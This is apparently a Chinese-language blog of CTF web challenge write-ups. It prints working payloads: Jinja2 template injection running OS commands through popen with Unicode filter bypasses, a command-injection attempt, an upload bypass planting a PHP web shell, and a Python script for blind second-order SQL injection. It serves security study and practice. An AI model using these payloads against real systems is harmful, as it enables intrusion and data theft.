<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211152724702.png" alt="image-20221211152724702"></p>
<p>发现存在模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:53335/&#123;&#123;7*&#x27;7&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211152927605.png" alt="image-20221211152927605"></p>
<p>发现是Jinja2或Twig模板</p>
<p>采用模板注入使用的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211153209592.png" alt="image-20221211153209592"></p>
<p>被过滤了</p>
<p>继续尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211153320309.png" alt="image-20221211153320309"></p>
<p>同样被过滤</p>
<p>继续尝试</p>
<p>采用request.args.key方式传参</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a]&#125;&#125;?a=__class__</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211153451884.png" alt="image-20221211153451884"></p>
<p>成功</p>
<p>获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221211153820782.png" alt="image-20221211153820782"></p>
<h2 id="43-cat"><a href="#43-cat" class="headerlink" title="43.cat"></a>43.cat</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228135430206.png" alt="image-20221228135430206"></p>
<p>让我们提交域名</p>
<p>我们提交一个百度域名试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228140345221.png" alt="image-20221228140345221"></p>
<p>发现ping同了并且URL中的url&#x3D;baidu.com</p>
<p>于是我们猜想是不是命令执行，然后我们利用“|”，可以进行命令拼接</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228140705061.png" alt="image-20221228140705061"></p>
<p>显示非法URL</p>
<p>有可能是字符过滤，看一下过滤了那些字符</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228144621083.png" alt="image-20221228144621083"></p>
<p>可以发现有”@“,”-“,”&#x2F;“,”.”没有过滤</p>
<p>尝试将未过滤的字符输入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228144732919.png" alt="image-20221228144732919"></p>
<p>发现url后面出现编码</p>
<p>尝试不同的url</p>
<p>我们多多尝试几个url编码，直到%80，以及后面都会出现报错信息</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228145157185.png" alt="image-20221228145157185"></p>
<p>将报错信息保存为1.html，然后打开</p>
<p>然后打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228145504369.png" alt="image-20221228145504369"></p>
<p>发现是Django框架，然后是参数进行Django解析时出现了gbk错误（就是参数超出了ascii范围0-127）</p>
<p><img src="https://img-blog.csdnimg.cn/6373565518434f10b501bca0b506bbdf.png" alt="在这里插入图片描述"></p>
<p>这下就有思路了，联想到@没有被过滤，可以猜想这里应该是用有关curl的这个点了（@前缀并使用文件完整路径），然后就是需要有Django开发 的一些基本知识（settings.py文件设置有数据库文件的路径，当然还需要注意settings.py的路经）</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228150250062.png" alt="image-20221228150250062"></p>
<p>找到sqlite3，继续查找</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228150538686.png" alt="image-20221228150538686"></p>
<h2 id="44-bug"><a href="#44-bug" class="headerlink" title="44.bug"></a>44.bug</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228161726991.png" alt="image-20221228161726991"></p>
<p>有登录注册找回密码功能</p>
<p>可能存在SQL注入，使用SQLmap扫描登录界面，没有发现漏洞</p>
<p>注册时可能存在二次注入，这里先放一下</p>
<p>注册一个账户然后找回密码，抓取数据包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228163600261.png" alt="image-20221228163600261">此时数据包请求修改密码。同时提交用户名和密码，如果在数据包中修改用户名和密码就可以实现越权</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228163619211.png" alt="image-20221228163619211"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228163637853.png" alt="image-20221228163637853"></p>
<p>这是密码就修改成功了，可以登录admin</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228163729014.png" alt="image-20221228163729014"></p>
<p>这是我们点击manage会显示IP不允许</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228163803099.png" alt="image-20221228163803099"></p>
<p>需要修改IP绕过</p>
<p>修改完后</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228163912382.png" alt="image-20221228163912382"></p>
<p>点击personal</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228164020851.png" alt="image-20221228164020851"></p>
<p>发现url也变了，尝试修改url中的UID访问其他用户</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228164104275.png" alt="image-20221228164104275"></p>
<p>发现不允许</p>
<p>回到where is the flag？页面，查看一下源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228164600796.png" alt="image-20221228164600796"></p>
<p>有一个提示</p>
<p>一般的文件的操作都是upload，尝试一下</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228164820760.png" alt="image-20221228164820760"></p>
<p>发现一个文件上传页面</p>
<p>只让上传图片，我们上传一个图片并抓包</p>
<p>文件内容为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>抓包后修改文件后缀名为php4或php5</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228165730441.png" alt="image-20221228165730441"></p>
<p>得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221228165802881.png" alt="image-20221228165802881"></p>
<h2 id="45-ics-07"><a href="#45-ics-07" class="headerlink" title="45.ics-07"></a>45.ics-07</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229151157916.png" alt="image-20221229151157916"></p>
<p>只有项目管理有用</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229151217614.png" alt="image-20221229151217614"></p>
<p>尝试输入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229151317896.png" alt="image-20221229151317896"></p>
<p>发现url发生变化，page和id都变了</p>
<p>其中view-source，提示我们看源码</p>
<p>这个view-source是可以点击的</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229151834895.png" alt="image-20221229151834895"></p>
<p>点击之后出现源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//page传参不能为空</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//page传参不能是index.php，否则改为flag.php</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">     </span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="comment">//chdir() 函数：改变当前的目录，需规定新目录</span></span><br><span class="line">           <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           <span class="comment">//fopen()打开文件</span></span><br><span class="line">           <span class="title function_ invoke__">fwrite</span>(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           <span class="comment">//fwrite写入文件内容，成功返回写入的字符数，否则返回 FALSE</span></span><br><span class="line">           <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">           <span class="comment">//fclose()关闭文件</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; <span class="title function_ invoke__">floatval</span>(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">          <span class="comment">//floatval()：返回变量的浮点值</span></span><br><span class="line">          <span class="comment">//===结果为true，则！==结果就为false</span></span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_GET</span>[id]);</span><br><span class="line">          <span class="comment">//mysql_real_escape_string() ：转义 SQL 语句中使用的字符串中的特殊字符</span></span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">          <span class="comment">//mysql_query() ：执行一条 MySQL 查询</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">          <span class="comment">//mysql_fetch_object() ：从结果集（记录集）中取得一行作为对象</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = False;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = True;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>意思就是输入项目名声和id使得$_SESSION[‘admin’] &#x3D; True，其中对id进行了一系列限制，id的浮点值不是1，且为字符串，且最后一位是9</p>
<p>由之前的代码我们知道，项目名称就是page，page需要是falg.php，而id构造为1c9</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229154559028.png" alt="image-20221229154559028"></p>
<p>得到id和name</p>
<p>之前代码中，我们需要传入参数$con </p>
<p>和 $file</p>
<p>其中con是要传入文件的的内容，file是文件名，并且要构造绕过</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229160210850.png" alt="image-20221229160210850"></p>
<p>之后进行蚁剑连接，有源码知道文件位于uploaded&#x2F;backup&#x2F;shell.php&#x2F;</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229160241389.png" alt="image-20221229160241389"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229160253778.png" alt="image-20221229160253778"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229160343098.png" alt="image-20221229160343098"></p>
<h2 id="46-unfinish"><a href="#46-unfinish" class="headerlink" title="46.unfinish"></a>46.unfinish</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229160457194.png" alt="image-20221229160457194"></p>
<p>题目提示SQL</p>
<p>先扫一下目录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229164204520.png" alt="image-20221229164204520"></p>
<p>扫到一个注册页面，可能存在二次注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221229164245797.png" alt="image-20221229164245797"></p>
<p>利用burp的fuzz看看过滤了啥</p>
<p>这些是没过滤的</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221230210611981.png" alt="image-20221230210611981"></p>
<p>我们推测这里的语句是</p>
<p>insert into tables value(‘$email’,’$username’,’$passwpord’);<br>登录成功后语句：</p>
<p>SELECT * FROM tables WHERE email &#x3D; ‘’$email”;<br>他这里注册的时候作了限制，所以联合查询这种方法不能用。</p>
<p>那么尝试在注册时用户名处进行闭合。</p>
<p>用户名处构造group_concat(1,database()),database’,’1’)#</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tables <span class="keyword">value</span>(<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;group_concat(1,database()),database&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)#<span class="string">&#x27;,&#x27;</span>$passwpord<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221230211304501.png" alt="image-20221230211304501"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221230211316921.png" alt="image-20221230211316921"></p>
<p>说明存在过滤</p>
<p>用户名注册时加个单引号注册失败，双引号注册成功，说明可能为单引号闭合；</p>
<p>注册一个</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221230211908183.png" alt="image-20221230211908183"></p>
<p>登陆试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221230212218818.png" alt="image-20221230212218818"></p>
<p>发现用户名处显示为0</p>
<p>说明存在注入</p>
<p>在mysql中 + 只能用于运算，且字符和数字运算过程中先把字符转成数字</p>
<p>我们就可以用这个方法，查看数据</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;0&#x27;</span><span class="operator">+</span>ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line"><span class="comment">--+ 将查找到的flag的第一位到第一位用ASCII码表示，然后和0相加，这样就知道第一位了，以此类推</span></span><br><span class="line"><span class="comment">--+ 逗号也没过滤了，尅用from···for···代替</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;0&#x27;</span><span class="operator">+</span>ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flag)<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>

<p>抄大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com%d&#x27;</span> % i,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from %d for 1)) + &#x27;0&quot;</span> % i,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com%d&#x27;</span> % i,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res_ = requests.post(url=login_url, data=login_data)</span><br><span class="line">    code = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(code.group(<span class="number">1</span>))), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221230214105419.png" alt="image-20221230214105419"></p>
<h2 id="47-easy-web"><a href="#47-easy-web" class="headerlink" title="47.easy_web"></a>47.easy_web</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231190746805.png" alt="image-20221231190746805"></p>
<p>输入某个字符会返回</p>
<p>burp抓包看看</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231191753194.png" alt="image-20221231191753194"></p>
<p>返回数据包中我们看到python&#x2F;3.7.12，于是我们想到用SSTI模板注入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231192508167.png" alt="image-20221231192508167"></p>
<p>发现输入的html执行了</p>
<p>看看绕过了什么</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231193350316.png" alt="image-20221231193350316"></p>
<p>测试的返回是所有的单字符，即 ascii中 33-127的所有字符（特殊符号，字母大小写，数字）</p>
<p>根据题意，我们可以通过特殊字符来绕过</p>
<p>特殊字符的网站<a target="_blank" rel="noopener" href="http://www.fhdq.net/">：符号大全-特殊符号-特殊符号大全 (fhdq.net)</a></p>
<p>直接输入 { 会被过滤掉，因此我们可以输入 ︷</p>
<p>对比发现，两种特殊符号都可以解析成 { </p>
<p><img src="https://img-blog.csdnimg.cn/84709c13e16a4cf2bec816513450089b.png" alt="img"></p>
<p>非常好用的ssti模板注入payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ssti特殊字符绕过脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#123; -&gt; ︷/﹛</span></span><br><span class="line"><span class="string">&#125; -&gt; ︸/﹜</span></span><br><span class="line"><span class="string">&#x27; -&gt; ＇</span></span><br><span class="line"><span class="string">, -&gt; ，</span></span><br><span class="line"><span class="string">&quot; -&gt; ＂</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">//此时的<span class="built_in">str</span>即你要输入的payload</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;&#x27;&#123;&#123;a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;&#x27;&#x27;&#x27;</span> <span class="comment"># 原字符串</span></span><br><span class="line"><span class="comment"># 如果需要替换replace(被替换的字符,替换后的字符)</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.replace(<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;︷&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.replace(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;︸&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;＇&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.replace(<span class="string">&#x27;\&quot;&#x27;</span>, <span class="string">&#x27;＂&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇ls＇).read()＂)︸︸</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231195533665.png" alt="image-20221231195533665"></p>
<p>查看根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇ls /＇).read()＂)︸︸</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231195701978.png" alt="image-20221231195701978"></p>
<p>找到flag</p>
<p>payload改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">︷︷a.__init__.__globals__.__builtins__.eval(＂__import__(＇os＇).popen(＇cat /flag＇).read()＂)︸︸</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221231195749169.png" alt="image-20221231195749169"></p>
<h2 id="48-checkInGame"><a href="#48-checkInGame" class="headerlink" title="48.checkInGame"></a>48.checkInGame</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101200710845.png" alt="image-20230101200710845"></p>
<p>题目有倒计时，burp抓包，然后做题，这样过了40秒，burp会截获数据包，因此可以继续做题，知道做完</p>
<p>然后就可以拿到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101200840684.png" alt="image-20230101200840684"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101200857446.png" alt="image-20230101200857446"></p>
<h2 id="49-BadProgrammer"><a href="#49-BadProgrammer" class="headerlink" title="49.BadProgrammer"></a>49.BadProgrammer</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101201150802.png" alt="image-20230101201150802"></p>
<p>基本没有可以点的</p>
<p>查看源码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101201618677.png" alt="image-20230101201618677"></p>
<p>观察源码发现静态文件存放在<code>/static/</code>目录下 </p>
<p>观察请求response header发现是nginx服务器加express框架：</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101201704737.png" alt="image-20230101201704737"></p>
<p>利用nginx配置错误，可以列目录：</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101201832641.png" alt="image-20230101201832641"></p>
<p>此时可以得到app.js源码：</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230101201856930.png" alt="image-20230101201856930"></p>
<p>在源码中有一个post 请求提交到&#x2F;4_pATh_y0u_CaNN07_Gu3ss 网站中，所以我们可以根据这一点进行漏洞利用</p>
<p>查看package.json文件，发现引用express-fileupload版本为1.1.7-alpha.4，此版本存在CVE-2020-7699，原型链污染漏洞。</p>
